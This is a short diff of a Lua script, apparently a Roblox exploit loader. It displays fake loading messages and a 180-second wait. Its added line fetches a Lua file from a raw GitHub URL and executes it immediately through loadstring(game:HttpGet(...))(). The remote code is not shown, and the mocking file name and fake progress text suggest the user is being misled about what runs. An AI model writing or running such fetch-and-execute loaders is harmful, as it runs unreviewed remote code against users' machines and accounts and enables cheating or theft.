@@ -12,4 +12,4 @@ _G.SecondText = "Script Is Kinda Laggy"
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/Speedy/main/SpeedyIsNowWorkingHaHa.lua", true))()
